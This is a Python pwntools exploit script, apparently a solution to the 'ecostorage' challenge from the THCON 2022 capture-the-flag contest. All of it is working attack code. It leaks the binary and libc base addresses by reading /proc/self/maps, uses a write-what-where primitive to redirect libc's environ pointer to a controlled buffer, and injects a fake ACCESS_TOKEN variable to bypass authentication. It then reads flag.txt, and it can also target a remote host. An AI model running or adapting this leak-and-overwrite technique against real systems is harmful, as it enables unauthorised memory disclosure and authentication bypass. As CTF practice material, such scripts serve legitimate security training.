#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ecostorage')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global libc
    global io

    io = start()

def write_what_where():
    coupon = "THCON2022"
    write = filename

    primitive = f"{environ} {write}"

    io.sendline("2")
    io.sendline(coupon)
    info("Write What Where: %#x --> %#x", environ, write)
    sleep(1)
    io.sendline(primitive)

def leak_memory():
    global environ, filename

    io.sendline("1")
    io.sendline("/proc/self/maps")
    io.recvuntil("maximum):")    
    io.recvline()
    binary_leak = io.recvline().split(b"-")[0]
    exe.address = int(binary_leak, 16)

    for _ in range(5):
        io.recvline()
    
    libc_leak = io.recvline().split(b"-")[0]
    libc.address = int(libc_leak, 16) + 0x3000
    environ = libc.sym['environ']
    filename = exe.sym['filename']

    info("ELF Base Address: %#x", exe.address)
    sleep(1)
    info("Libc Base Address: %#x", libc.address)
    sleep(1)
    info("Libc Environ Address: %#x", environ)
    sleep(1)
    info("Filename Address: %#x", filename)

def overwrite_env():
    io.sendline("1")
    io.recvuntil("Filename:")

    name = p64(filename+0x10)
    name += b'A'*8
    name += b"ACCESS_TOKEN=1337\x00"

    io.sendline(name)

    io.sendline("2")
    io.recvuntil("token:")
    io.sendline("1337")


def get_flag():
    io.sendline("1")
    io.recvuntil("Filename:")
    io.sendline("flag.txt")
    io.recvuntil("content:")
    io.recvline()
    flag = io.recvline().decode()
    info(f"Flag: {flag}")

    io.sendline("0")
    io.close()


def main():
    init()
    leak_memory()
    write_what_where()
    overwrite_env()
    get_flag()
    
if __name__ == '__main__':
    main()

